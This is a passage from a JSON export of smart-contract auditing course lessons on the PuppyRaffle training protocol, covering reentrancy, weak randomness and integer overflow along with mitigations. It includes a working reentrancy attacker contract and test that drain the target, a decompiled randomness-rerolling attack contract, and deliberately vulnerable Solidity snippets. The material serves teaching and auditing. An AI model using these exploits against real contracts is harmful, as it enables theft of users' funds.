Example</summary>\n\n```js\nbool locked = false;\nfunction withdrawBalance() public {\n    if(locked){\n        revert;\n    }\n    locked = true;\n\n    // Checks\n    // Effects\n    uint256 balance = userBalance[msg.sender];\n    userBalance[msg.sender] = 0;\n    // Interactions\n    (bool success,) = msg.sender.call{value: balance}(\"\");\n    if (!success) {\n        revert();\n    }\n    locked = false;\n}\n```\n\n</details>\n<br>\n\nLastly, we learnt how this problem still plagues us today. Through this [**repo**](https://github.com/pcaversaccio/reentrancy-attacks) managed by Pascal et al, we can see a horrifying list, 7 years long, of just this single attack vector. We also uncovered a case study in [**The DAO hack**](https://medium.com/@zhongqiangc/smart-contract-reentrancy-thedao-f2da1d25180c) and saw just how severe this issue can be.\n\nArmed with all of this knowledge, surely you will _never_ miss a re-entrancy attack again. Let's move onto the PoC.\n",
          "updates": []
        },
        {
          "lessonId": "f8a232ac-d0a5-4f2e-b2f8-ec7dd5790aa4",
          "number": 23,
          "title": "Reentrancy: PoC",
          "slug": "reentrancy-poc",
          "folderName": "23-reentrancy-poc",
          "description": "",
          "duration": 8,
          "videoUrl": "AyeF5xrkAiYrAm4uH1id2JlumwL67Re1GpzerPTrTYQ",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/23-reentrancy-poc/+page.md",
          "markdownContent": "---\ntitle: Reentrancy - PoC\n---\n\n_Follow along with this video:_\n\n---\n\n### Reentrancy in PuppyRaffle\n\nReturning to PuppyRaffle, let's look at how all we've learnt affects this protocol.\n\nA look again at this `refund` function and we see a classic case of reentrancy with an external call being made before updating state.\n\n```js\nfunction refund(uint256 playerIndex) public {\n    address playerAddress = players[playerIndex];\n    require(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\n    require(playerAddress != address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n\n    // @Audit: Reentrancy\n    payable(msg.sender).sendValue(entranceFee);\n\n    players[playerIndex] = address(0);\n    emit RaffleRefunded(playerAddress);\n}\n```\n\n### The PoC\n\nWe can start by writing a new test in the protocol's `PuppyRaffle.t.sol` file. We'll have a bunch of players enter the raffle.\n\n```js\nfunction test_reentrancyRefund() public {\n    address[] memory players = new address[](4);\n    players[0] = playerOne;\n    players[1] = playerTwo;\n    players[2] = playerThree;\n    players[3] = playerFour;\n    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);\n\n}\n```\n\n> **Note:** There _is_ a `playersEntered` modifier we could use, included in this test suite, but we'll choose to be explicit here.\n\nNext we'll create our `ReentrancyAttacker` Contract.\n\n```js\ncontract ReentrancyAttacker {\n    PuppyRaffle puppyRaffle;\n    uint256 entranceFee;\n    uint256 attackerIndex;\n\n    constructor(PuppyRaffle _puppyRaffle) {\n        puppyRaffle = _puppyRaffle;\n        entranceFee = puppyRaffle.entranceFee();\n    }\n\n    function attack() public payable {\n        address[] memory players = new address[](1);\n        players[0] = address(this);\n        puppyRaffle.enterRaffle{value: entranceFee}(players);\n        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));\n        puppyRaffle.refund(attackerIndex);\n    }\n}\n```\n\nOnce deployed, this `attack` function is going to kick off the attack. In order, we're entering the raffle, acquiring our `playerIndex`, and then refunding our `entranceFee`.\n\nThis is going to cause our entranceFee to be sent back to our contract ... what happens then?\n\n```js\nfunction _stealMoney() internal {\n    if (address(puppyRaffle).balance >= entranceFee) {\n        puppyRaffle.refund(attackerIndex);\n\n    }\n}\n\nfallback() external payable {\n    _stealMoney();\n}\n\nreceive() external payable {\n    _stealMoney();\n}\n```\n\nAdding these functions to our `ReentrancyAttacker` contract finishes the job. When funds are sent back to our contract, the `fallback` or `receive` functions are called which is going to trigger another `refund` call in our `_stealMoney` function, completing the loop until the `PuppyRaffle` contract is drained!\n\n<details>\n<summary> ReentrancyAttacker Contract </summary>\n\n```js\ncontract ReentrancyAttacker {\n    PuppyRaffle puppyRaffle;\n    uint256 entranceFee;\n    uint256 attackerIndex;\n\n    constructor(PuppyRaffle _puppyRaffle) {\n        puppyRaffle = _puppyRaffle;\n        entranceFee = puppyRaffle.entranceFee();\n    }\n\n    function attack() public payable {\n        address[] memory players = new address[](1);\n        players[0] = address(this);\n        puppyRaffle.enterRaffle{value: entranceFee}(players);\n        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));\n        puppyRaffle.refund(attackerIndex);\n    }\n\n    function _stealMoney() internal {\n        if (address(puppyRaffle).balance >= entranceFee) {\n            puppyRaffle.refund(attackerIndex);\n\n        }\n    }\n    fallback() external payable {\n        _stealMoney();\n    }\n    receive() external payable {\n        _stealMoney();\n    }\n}\n```\n\n</details>\n<br>\n\nAlright, let's add this logic to our test. First we'll create an instance of the attacker contract and an attacker address, funding it with 1 ether.\n\n```js\nReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);\naddress attacker = makeAddr(\"attacker\");\nvm.deal(attacker, 1 ether);\n```\n\nNext, we'll grab some balances so we're ablee to log our changes after the attack.\n\n```js\nuint256 startingAttackContractBalance = address(attackerContract).balance;\nuint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;\n```\n\nWe finally call the attack, like so:\n\n```js\nvm.prank(attacker);\nattackerContract.attack{value: entranceFee}();\n```\n\nThen we'll console.log the impact:\n\n```js\nconsole.log(\"attackerContract balance: \", startingAttackContractBalance);\nconsole.log(\"puppyRaffle balance: \", startingPuppyRaffleBalance);\nconsole.log(\n  \"ending attackerContract balance: \",\n  address(attackerContract).balance\n);\nconsole.log(\"ending puppyRaffle balance: \", address(puppyRaffle).balance);\n```\n\n<details>\n<summary>test_reentrancyRefund</summary>\n\n```js\nfunction test_reentrancyRefund() public {\n    // users entering raffle\n    address[] memory players = new address[](4);\n    players[0] = playerOne;\n    players[1] = playerTwo;\n    players[2] = playerThree;\n    players[3] = playerFour;\n    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);\n\n    // create attack contract and user\n    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);\n    address attacker = makeAddr(\"attacker\");\n    vm.deal(attacker, 1 ether);\n\n    // noting starting balances\n    uint256 startingAttackContractBalance = address(attackerContract).balance;\n    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;\n\n    // attack\n    vm.prank(attacker);\n    attackerContract.attack{value: entranceFee}();\n\n    // impact\n    console.log(\"attackerContract balance: \", startingAttackContractBalance);\n    console.log(\"puppyRaffle balance: \", startingPuppyRaffleBalance);\n    console.log(\"ending attackerContract balance: \", address(attackerContract).balance);\n    console.log(\"ending puppyRaffle balance: \", address(puppyRaffle).balance);\n}\n```\n\n</details>\n<br>\n\nAll we need to do now is run this test with the command `forge test --mt test_reentrancyRefund -vvv` and we should receive...\n\n<img src=\"/security-section-4/23-reentrancy-poc/reentrancy-poc1.png\" style=\"width: 75%; height: auto;\">\n\n### Wrap Up\n\nWe did it! We've proven the vulnerability through our application of our PoC and we'll absolutely be submitting this as a finding - likely a `High`.\n\nBe very proud of what you've learnt so far, you're now armed to safeguard De-Fi against some of the most prevalent vulnerabilities in Web3.\n\nLet's go back to the code back and continue our recon in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "31709f46-91b8-4eb4-88bd-a14600106ae5",
          "number": 24,
          "title": "Recon: Continued",
          "slug": "recon-continued",
          "folderName": "24-recon-continued",
          "description": "",
          "duration": 5,
          "videoUrl": "NhZ500cBSKSrf6ROlqMhqPtbQoOHbi6WoEe51H9C2x2I",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/24-recon-continued/+page.md",
          "markdownContent": "---\ntitle: Recon Continued\n---\n\n_Follow along with this video:_\n\n---\n\nLet's continue with our manual review of PuppyRaffle. So far we've gone through\n\n- enterRaffle - where we uncovered a DoS vulnerability\n- refund - we discovered is vulnerable to reentrancy\n- getActivePlayerIndex - we found an edge case where players at index 0 aren't sure if they've entered the raffle!\n\nWalking through the code, we're moving onto the `selectWinner` function. This is a big one, we'll have a lot to go over.\n\n```js\nfunction selectWinner() external {\n    require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n    require(players.length >= 4, \"PuppyRaffle: Need at least 4 players\");\n    uint256 winnerIndex =\n        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n    address winner = players[winnerIndex];\n    uint256 totalAmountCollected = players.length * entranceFee;\n    uint256 prizePool = (totalAmountCollected * 80) / 100;\n    uint256 fee = (totalAmountCollected * 20) / 100;\n    totalFees = totalFees + uint64(fee);\n\n    uint256 tokenId = totalSupply();\n\n    // We use a different RNG calculate from the winnerIndex to determine rarity\n    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;\n    if (rarity <= COMMON_RARITY) {\n        tokenIdToRarity[tokenId] = COMMON_RARITY;\n    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {\n        tokenIdToRarity[tokenId] = RARE_RARITY;\n    } else {\n        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;\n    }\n\n    delete players;\n    raffleStartTime = block.timestamp;\n    previousWinner = winner;\n    (bool success,) = winner.call{value: prizePool}(\"\");\n    require(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n    _safeMint(winner, tokenId);\n}\n```\n\nThe function's NatSpec makes it's purpose quite clear.\n\n```js\n/// @notice this function will select a winner and mint a puppy\n/// @notice there must be at least 4 players, and the duration has occurred\n/// @notice the previous winner is stored in the previousWinner variable\n/// @dev we use a hash of on-chain data to generate the random numbers\n/// @dev we reset the active players array after the winner is selected\n/// @dev we send 80% of the funds to the winner, the other 20% goes to the feeAddress\n```\n\nWe can see the first thing this function is doing is performing some checks. Given what we recently learnt a reasonable question to ask might be _Is this following CEI?_\n\nWell, in this instance the only thing happening after our external call is `_safeMint`. We're not really sure what this is yet, so we may come back to it.\n\n```js\n  (bool success,) = winner.call{value: prizePool}(\"\");\n  require(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n  _safeMint(winner, tokenId);\n```\n\nOne of our checks requires the `raffleDuration` to have passed, verifying this variable is set properly would be another thing we would want to check. In this case the `raffleDuration` is set in our constructor, the `raffleStartTime` is set during the instant of deployment. Looks good.\n\n```js\nrequire(block.timestamp >=\n  raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n```\n\nI encourage you to write these thoughts down in your `notes.md` file and actually write in-line notes to keep them organized. Being able to reference these thoughts during our write ups and later in the review is incredibly valuable to the proceess.\n\n```js\n// @Audit: Does this follow CEI?\n// @Audit: Are the duration and time being set correctly?\n// @Audit: What is _safeMint doing after our external call?\n```\n\nIt's important to note the `selectWinner` function is external, so anyone can call it. The checks in this function will be really important, but they do look good.\n\nMoving on, the next this thing function is doing is defining a `winnerIndex`.\n\n```js\nuint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\naddress winner = players[winnerIndex];\n```\n\nIt seems our function is using a pseudo-random number, modded by the player's array to choose our winning index. It then assigns the player at that index in the array to our `winner` variable.\n\nThis winner variable is used further in the function to distribute the `prizePool` as well as mint the winning NFT.\n\n```js\n(bool success,) = winner.call{value: prizePool}(\"\");\nrequire(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n_safeMint(winner, tokenId);\n```\n\nIt's important that this selection is fair and truly random or this could be exploited by malicious actors fairly easily. My alarm bells are going off and I'm seeing a lot of red flags.\n\n### Wrap Up\n\nHaving gone through the `selectWinner` function, we now have a better understanding of this process and how it's controlleed.\n\nThe function can't be called until the `raffleDuration` has passed and there are at least 4 people entered. Once `selectWinner` is called and passes checks, it uses a pseudo-random method to determine a winner of the raffle and then transfers the `prizePool` and mints them an NFT.\n\nThe question becomes:\n\n```js\n// @Audit: Is this selection process fair/truly random?\n```\n\nLet's look more closely in the next lesson!\n\n> **Challenge:** There is a **massive** bug with refund + selectWinner that we _don't_ go over here. I challenge you to find it!\n",
          "updates": []
        },
        {
          "lessonId": "6b574a27-6e1f-4aa4-a421-8a51b18cdb90",
          "number": 25,
          "title": "Exploit: Weak randomness",
          "slug": "exploit-weak-randomness",
          "folderName": "25-exploit-weak-randomness",
          "description": "",
          "duration": 4,
          "videoUrl": "Ej3Cgk3xfWXpqa8P5WTCNBFDCo7vVRk01wkjViEzUkfI",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/25-exploit-weak-randomness/+page.md",
          "markdownContent": "---\ntitle: Exploit - Weak Randomness\n---\n\n_Follow along with this video:_\n\n---\n\n### Weak Randomness Overview\n\nThis will be a quick overview, but there are a view ways that Weak Randomness can cause issues.\n\nLet's actually take a moment to go back to `Slither` because, if you can believe it, `Slither` will actually catch this for us.\n\n```bash\nslither .\n```\n\nRunning slither as above we can see it's output contains the following:\n\n<img src=\"/security-section-4/25-exploit-weak-randomness/weak-randomness1.png\" style=\"width: 75%; height: auto;\">\n\nSo what is this detector telling us - that `PuppyRaffle.sol` is using weak PRNG or Pseudo Random Number Generation. We can navigate to the [**link provided**](https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG) for more information and a simplified example of this vulnerability.\n\n<img src=\"/security-section-4/25-exploit-weak-randomness/weak-randomness2.png\" style=\"width: 75%; height: auto;\">\n\nBeyond what's outlined here as a concern - that miners can influence global variables favorable - there's a lot more _weirdness_ that goes into random numbers on-chain.\n\nIf you've seen any of my other content, you know that Chainlink VRF is a solution for this problem, and I encourage you to check out the [**documentation**](https://docs.chain.link/vrf) for some additional learnings.\n\n### Remix Examples\n\nReturn to our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo and we've included a link to a [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) of this vulnerability.\n\n> This contract is available for local testing as well [**here**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol).\n\nLooking at the `Remix` example, we can see it's doing something very similar to what `PuppyRaffle` is doing\n\n```js\nuint256 randomNumber = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp)));\n```\n\nIn this declaration we're taking 3 variables:\n\n- msg.sender\n- block.prevrandao\n- block.timestamp\n\nWe're hashing these variables and casting the result as a uint256. The problem exists in that the 3 variables we're deriving our number from are able to be influenced or anticipated such that we can predict what the random number will be.\n\nThe test set up in [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) may look a little silly, but what's trying to be conveyed is that generating the same random number in a single block is another example of how this vulnerability can be exploited.\n\n```js\n// For this test, a user could just deploy a contract that guesses the random number...\n// by calling the random number in the same block!!\nfunction test_guessRandomNumber() public {\n    uint256 randomNumber = weakRandomness.getRandomNumber();\n\n    assertEq(randomNumber, weakRandomness.getRandomNumber());\n}\n```\n\n### Wrap Up\n\nIn short - the blockchain is deterministic. Using on-chain variables and pseudo random number generation leaves a protocol open to exploits whereby an attacker can predict or manipulate the 'random' value.\n\nThere multiple ways that weak randomness can be exploited, and we'll be going through them in the next lesson!\n",
          "updates": []
        },
        {
          "lessonId": "553ec8a3-8e89-4408-b1a0-df917a61e099",
          "number": 26,
          "title": "Weak randomness: Multiple issues",
          "slug": "weak-randomness-multiple-issues",
          "folderName": "26-weak-randomness-multiple-issues",
          "description": "",
          "duration": 4,
          "videoUrl": "K2A00fSWWtRpOFj32H900qMwvS779kZXOAl00GFThIVu5o",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/26-weak-randomness-multiple-issues/+page.md",
          "markdownContent": "---\ntitle: Weak Randomness - Multiple Issues\n---\n\n_Follow along with this video:_\n\n---\n\n### Weak Randomness Breakdown\n\nLet's look at a few ways that randomness, as we've seen in `PuppyRaffle` and our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) examples, can be manipulated.\n\n<img src=\"/security-section-4/26-weak-randomness-issues/randomness-issues1.png\" style=\"width: 75%; height: auto;\">\n\n### block.timestamp\n\nRelying on block.timestamp is risky for a few reasons as node validators/miners have privileges that may give them unfair advantages.\n\nThe validator selected for a transaction has the power to:\n\n- Hold or delay the transaction until a more favorable time\n- Reject the transaction because the timestamp isn't favorable\n\nTimestamp manipulation has become less of an issue on Ethereum, since the merge, but it isn't perfect. Other chains, such as Arbitrum can be vulnerable to several seconds of slippage putting randomness based on `block.timestamp` at risk.\n\n### block.prevrandao\n\n`block.prevrandao` was introduced to replace `block.difficulty` when the merge happened. This is a system to choose random validators.\n\nThe security issues using this value for randomness are well enough known that many of them are outlined in the [**EIP-4399**](https://eips.ethereum.org/EIPS/eip-4399) documentation already.\n\nThe security considerations outlined here include:\n\n**Biasability:** The beacon chain RANDAO implementation gives every block proposer 1 bit of influence power per slot. Proposer may deliberately refuse to propose a block on the opportunity cost of proposer and transaction fees to prevent beacon chain randomness (a RANDAO mix) from being updated in a particular slot.\n\n**Predictability:** Obviously, historical randomness provided by any decentralized oracle is 100% predictable. On the contrary, the randomness that is revealed in the future is predictable up to a limited extent.\n\n### msg.sender\n\nAny field controlled by a caller can be manipulated. If randomness is generated from this field, it gives the caller control over the outcome.\n\nBy using msg.sender we allow the caller the ability to mine for addresses until a favorable one is found, breaking the randomness of the system.\n\n### Wrap Up\n\nThis should all make sense. The blockchain is a deterministic system, any number we derive from it, is by definition going to be deterministic.\n\nWe've touched on a few ways this vulnerability can be exploited, in the next lesson we'll investigate a case study that should illustrate the potential impact of a weakness like this.\n\nMeanwhile, I encourage you to experiment further with how the vulnerability works within our [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) and [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) examples.\n",
          "updates": []
        },
        {
          "lessonId": "a783af65-794e-42cd-b1e3-74c9ce450915",
          "number": 27,
          "title": "Case Study: Weak Randomness",
          "slug": "weak-randomness-case-study",
          "folderName": "27-weak-randomness-case-study",
          "description": "",
          "duration": 7,
          "videoUrl": "xlTTGNN02YD3RRQDZBOAo00gTiZHjzxMubn5S02n71PTvw",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/27-weak-randomness-case-study/+page.md",
          "markdownContent": "---\ntitle: Weak Randomness - Case Study\n---\n\n_Follow along with this video:_\n\n---\n\n### Intro to Meebits and Andy Li\n\nLet's look into a case study that involves the exploit of an NFT project, Meebits, which occurred in 2021. This analysis will shed light on a real-world example of how weak randomness was exploited, resulting in a substantial loss of nearly a million dollars for the protocol.\n\nWe extend our appreciation to [**Andy Li**](https://twitter.com/andyfeili) from [**Sigma Prime**](https://sigmaprime.io/) who walks us through the details of this attack.\n\n_Information in this post is graciously provided by Andy_\n\nRemember, periodically conducting post mortems like this greatly contributes towards honing your skills as a security researcher. Familiarity begets mitigation.\n\n### Case Study: Meebits - Insecure Randomness\n\nMeebits, created by Larva Labs (team behind CryptoPunks), was exploited in May 2021 due to insecure randomness in its smart contracts. By rerolling their randomness, an attacker was able to obtain a rare NFT which they sold for $700k.\n\nThe concept behind Meebits was simple. If you owned a CryptoPunk, you could mint a free Meebit NFT. The attributes of this newly minted NFT were supposed to be random, with some traits being more valuable than others. However, owing to exploitable randomness, the attacker could reroll their mint until they obtained an NFT with desirable traits.\n\n### How the Attack Happened\n\nThere were 4 distinct things that occured.\n\n**Metadata Disclosure:** The Meebit contract contained an IPFS hash which pointed to metadata for the collection. Within the Metadata there existed a string of text that clearly disclosed which traits would be the most rare\n\n    \"...While just five of the 20,000 Meebits are of the dissected form, which is the rarest. The kinds include dissected, visitor, skeleton, robot, elephant, pig and human, listed in decreasing order of rarity.\"\n\nIn addition to this, the `tokenURI` function allowed public access to the traits of your minted Meetbit, by passing the function your tokenId.\n\n**Insecure Randomness:** Meebits calculated a random index based on this line of code:\n\n```js\nuint index = uint(keccak256(abi.encodePacked(nonce, msg.sender, block.difficulty, block.timestamp))) % totalSize;\n```\n\nThis method to generate an index is used within Meebit's `randomIndex` function when minting an NFT.\n\n```js\nfunction _mint(address _to, uint createdVia) internal returns (uint) {\n        require(_to != address(0), \"Cannot mint to 0x0.\");\n        require(numTokens < TOKEN_LIMIT, \"Token limit reached.\");\n        uint id = randomIndex();\n\n        numTokens = numTokens + 1;\n        _addNFToken(_to, id);\n\n        emit Mint(id, _to, createdVia);\n        emit Transfer(address(0), _to, id);\n        return id;\n    }\n```\n\n**Attacker Rerolls Mint Repeatedly:** The attacker in this case deployed a contract which did two things.\n\n1. Calls `mint` to mint an NFT\n2. Checks the 'random' Id generated and reverts the `mint` call if it isn't desirable.\n\nThe attack contract wasn't verified, but if we decompile its bytecode we can see the attack function.\n\n```js\nfunction 0x1f2a8a19(uint256 varg0) public nonPayable {\n    require(msg.data.length -4 >= 32);\n    require(bool(stor_2_0_19.code.size));\n    v0, /*uint256*/ v1 = stor_2_0_19.mintWithPunkOrGlyph(varg0).gas(msg.gas);\n    require(bool(v0), 0, RETURNDATASIZE());\n    require(RETURNDATASIZE() >= 32);\n    assert(bool(uint8(map_1[v1]))==bool(1));\n    v2 = address(block.coinbase).call().value(0xde0b6b3a7640000);\n    require(bool(v2), 0, RETURNDATASIZE());\n}\n```\n\nThe above my be a little complex, but these are the important lines to note:\n\n```js\nv0, /*uint256*/ (v1 = stor_2_0_19.mintWithPunkOrGlyph(varg0).gas(msg.gas));\n```\n\nand\n\n```js\nassert(bool(uint8(map_1[v1])) == bool(1));\n```\n\nThe first line is where the mint function is being called by the attacking contract.\n\nThe second line is where an assertion is made that the minted NFT has the desired rare traits. If this assersion fails, the whole transaction is reverted.\n\n**Attacker Receives Rare NFT:**\n\nThe attacking contract called this mint function and reverted for over 6 hours. Spending ~$20,000/hour in gas until they minted the rare NFT they wanted Meebit #16647. The NFT possessed a Visitor trait and sold for ~$700,000.\n\n<img src=\"/security-section-4/27-weak-randomness-case-study/meebit1.png\" style=\"width: 75%; height: auto;\">\n\n### Wrap Up\n\nThere you have it. That's how an attacker in 2021 was able to exploit weak randomness in the Meetbits contract.\n\nThanks again to Andy! In the next lesson we'll be going over how to prevent this madness!\n",
          "updates": []
        },
        {
          "lessonId": "dde6f9a7-4b37-4472-bfdc-0d0b894b01cb",
          "number": 28,
          "title": "Weak randomness: Mitigation",
          "slug": "weak-randomness-mitigation",
          "folderName": "28-weak-randomness-mitigation",
          "description": "",
          "duration": 1,
          "videoUrl": "mJOyBovWIwZYszgVMcBetmpet4VbtRP3YXyzwpwblrk",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/28-weak-randomness-mitigation/+page.md",
          "markdownContent": "---\ntitle: Weak Randomness - Mitigation\n---\n\n_Follow along with this video:_\n\n---\n\n### Mitigating Weak Randomness\n\nIn short, relying on on-chain data to generate random numbers is problematic due to the deterministic nature of the blockchain. The easiest way to mitigate this is to generate random numbers off-chain.\n\nSome off-chain solutions include:\n\n**Chainlink VRF:** \"A provably fair and verifiable random number generator (RNG) that enables smart contracts to access random values without compromising security or usability. For each request, Chainlink VRF generates one or more random values and cryptographic proof of how those values were determined. The proof is published and verified on-chain before any consuming applications can use it. This process ensures that results cannot be tampered with or manipulated by any single entity including oracle operators, miners, users, or smart contract developers.\" - I encourage you to [**check out the Docs**](https://docs.chain.link/vrf).\n\n**Commit Reveal Scheme:** \"The scheme involves two steps: commit and reveal.\n\nDuring the commit phase, users submit a commitment that contains the hash of their answer along with a random seed value. The smart contract stores this commitment on the blockchain. Later, during the reveal phase, the user reveals their answer and the seed value. The smart contract then checks that the revealed answer and the hash match, and that the seed value is the same as the one submitted earlier. If everything checks out, the contract accepts the answer as valid and rewards the user accordingly.\" - Read more in this [**Medium Article**](https://medium.com/coinmonks/commit-reveal-scheme-in-solidity-c06eba4091bb)!\n",
          "updates": []
        },
        {
          "lessonId": "3c4d644f-5c2f-4298-a398-ab81c8d9e0b9",
          "number": 29,
          "title": "Exploit: Integer overflow",
          "slug": "exploit-integer-overflow",
          "folderName": "29-exploit-integer-overflow",
          "description": "",
          "duration": 8,
          "videoUrl": "rqT5q00UWGMM7yy82yK02h3655YYtJV832DU8yhhOWCR4",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/29-exploit-integer-overflow/+page.md",
          "markdownContent": "---\ntitle: Exploit - Integer Overflow\n---\n\n_Follow along with this video:_\n\n---\n\n### Continuing with selectWinner\n\nWe've only just started with the `selectWinner` function and we've already found another issue. Let's keep going and see if we can find more.\n\n```js\nfunction selectWinner() external {\n        require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n        require(players.length >= 4, \"PuppyRaffle: Need at least 4 players\");\n        uint256 winnerIndex =\n            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n        address winner = players[winnerIndex];\n        // @Audit: Why the calculationi for totalAmountCollected, why not address(this).balance?\n        uint256 totalAmountCollected = players.length * entranceFee;\n        // @Audit:80% prizePool, 20% fee. Is this correct? Arithmatic may lead to precision loss\n        uint256 prizePool = (totalAmountCollected * 80) / 100;\n        uint256 fee = (totalAmountCollected * 20) / 100;\n        // @Audit: Total fees the owner should be able to collect. Why the casting? Overflow.\n        totalFees = totalFees + uint64(fee);\n\n        ...\n```\n\nAssessing the function snippet above I notice a few things that may be worth noting in our `notes.md` and/or by leaving in-line notes like shown.\n\n```js\ntotalFees = totalFees + uint64(fee);\n```\n\nThis line in particular sets my alarm bells off. My experience tells me that this is at risk of `integer overflow`. This is a bit of a classic issue, as newer versions of Solidity (>=0.8.0) are protected from it.\n\nHead back to [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) and let's have a closer look at how this works.\n\nNavigating to `src/arithmetic/OverflowAndUnderflow.sol` we can see a simple example of how this works.\n\n```js\ncontract Overflow {\n    uint8 public count;\n\n    // uint8 has a max value of 255, so if we add 1 to 255, we get 0 if it's unchecked!\n    // Versions prior to 0.8 of solidity also have this issue\n    function increment(uint8 amount) public {\n        unchecked {\n            count = count + amount;\n        }\n    }\n}\n```\n\n`unchecked` is a keyword in later versions of Solidity, this is being used to tell the compiler not to check for things like overflow. In earlier versions of Solidity (prior to 0.8.0) there were no checks by default.\n\n### Overflow Remix Example\n\nWe've provide a [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/arithmetic/OverflowAndUnderflow.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) to experiment with and get a sense of things.\n\nBy compiling and deploying our `Overflow.sol` contract, we should be met with this:\n\n<img src=\"/security-section-4/29-exploit-integer-overflow/overflow1.png\" style=\"width: 75%; height: auto;\">\n\nThe max value of a uint8 is 255. Our `count` variable starts at 0, so let's just pick a number to start with, say 200.\n\n<img src=\"/security-section-4/29-exploit-integer-overflow/overflow2.png\" style=\"width: 75%; height: auto;\">\n\nCalling increment updates our `count` variable. No problem so far. Now let's add 60 to our number. `count` should total 260, but what do you think we'll get?\n\n<img src=\"/security-section-4/29-exploit-integer-overflow/overflow3.png\" style=\"width: 75%; height: auto;\">\n\nWe get 4! This is because our integer is hitting the cap of 255, and then wrapping back to 0.\n\n> **Note:** This true for ints and uints in all versions of Solidity **prior to** 0.8.0.\n>\n> In Solidity versions 0.8.0+ `unchecked` is required to expose this vulnerability. Uints and ints are `checked` by default. If a max is surpassed in these versions, the transaction will revert.\n\nThe situation is the same in circumstances of `underflow`. An integer will wrap to the max value if reduced past it's limit. You can practice this with our remix example as well.\n\n```js\ncontract Underflow {\n    uint8 public count;\n\n    // uint8 has a min value of 0, but if we subtract 1 from 0, we get 255 if it's unchecked!\n    // Versions prior to 0.8 of solidity also have this issue\n    function decrement() public {\n        unchecked {\n            count--;\n        }\n    }\n}\n```\n\n### Precision Loss\n\nThe last vulnerability outlined in this repo is `precision loss`.\n\n```js\ncontract PrecisionLoss {\n    uint256 public moneyToSplitUp = 225;\n    uint256 public users = 4;\n\n    // This function will return 56, but we want it to return 56.25\n    function shareMoney() public view returns (uint256) {\n        return moneyToSplitUp / users;\n    }\n}\n```\n\n<img src=\"/security-section-4/29-exploit-integer-overflow/overflow4.png\" style=\"width: 75%; height: auto;\">\n\nAt its root, this is because Solidity doesn't support float point numbers. Any time we're performing a division operation, we need to be aware of this potential loss of precision.\n\n### Wrap Up\n\nA Proof of Concept/Code for this vulnerability should be pretty straightforward, so I won't be walking through one, but I challenge you to write one yourself.\n\nIf you get stuck - you can check out the [**audit-data**](https://github.com/Cyfrin/4-puppy-raffle-audit/tree/audit-data) branch of the Puppy Raffle Repo for guidance. **_Don't Cheat!_**\n\nLet's keep going!\n",
          "updates": []
        },
        {
          "lessonId": "b9ba2a58-137e-4622-a91d-f0f28eff6c01",
          "number": 30,
          "title": "Integer overflow: Mitigation",
          "slug": "integer-overflow-mitigation",
          "folderName": "30-integer-overflow-mitigation",
          "description": "",
          "duration": 2,
          "videoUrl": "g4oqGIg7hF0102exQnyBhNlaAB2OsX6WKuZ8wYRr02Gns8",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/30-integer-overflow-mitigation/+page.md",
